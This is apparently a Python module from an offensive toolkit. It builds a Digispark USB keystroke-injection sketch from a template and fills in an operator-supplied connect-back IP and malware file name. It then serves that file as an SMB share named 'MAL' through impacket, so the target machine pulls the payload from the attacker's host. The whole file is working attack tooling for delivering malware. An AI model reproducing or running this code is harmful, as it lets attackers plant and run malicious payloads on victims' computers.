from impacket import smbserver
import time, shutil
import os, sys
import threading

reset = '\033[32;0;0m'
header = '\033[95m'
blue = '\033[94m'
pos = '\033[92m'
info = '\033[93m'
neg = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

def check(payload):
    if os.path.isfile(payload):
        return True
    else:
        return False


def kill():
        pid = os.getpid()
        os.system('kill -9 %s' % str(pid))

def execute():
        host = raw_input(info + ' Enter the connect back IP addr: ')
        payload_check = False
        while payload_check == False:
            payload = raw_input(info + ' Payload: ' + reset)
            if check(payload) == True: payload_check = True
            else: print(neg + " [-] The specified file doesn\'t exist. Try agains" + reset)
        f = open('modules/smb_vec.ino', 'r')
        code = f.read()
        f.close()
        shutil.copy(payload, 'server/')
        os.chdir('server/')
        
        try:
                mal  = payload.split('/')[-1]
                
        except:
                pass
        '''
        if '/' in payload:
            os.rename(payload, os.getcwd() +'/' + mal)
        else:
            os.rename('../' + mal, os.getcwd()+ '/' + mal)
        '''
        code = code.replace('|host|', host)
        code = code.replace('|mal|', mal)
        #print code
        ino_name = 'smb_vec' + str(time.ctime()).replace(' ', '-') + '.ino'
        ino = open(ino_name, 'w')
        ino.write(code)
        ino.close()
        print(blue + ' [+] Digispark code is saved to %s' % BOLD + UNDERLINE + os.getcwd() +'/'+ ino_name + reset)
        print(info + " [!] Starting SMB server..." + reset)

        server = smbserver.SimpleSMBServer()
        server.addShare('MAL', os.getcwd())
        server.setSMB2Support(True)
        try:  
            def server_():
                server.start()
            thread = threading.Thread(target=server_)
            thread.start()
            raw_input(' Server started.' + neg + ' Hit enter to stop.')
            kill()
        except Exception as e:
                print(neg + ' Error! %s ' % e)
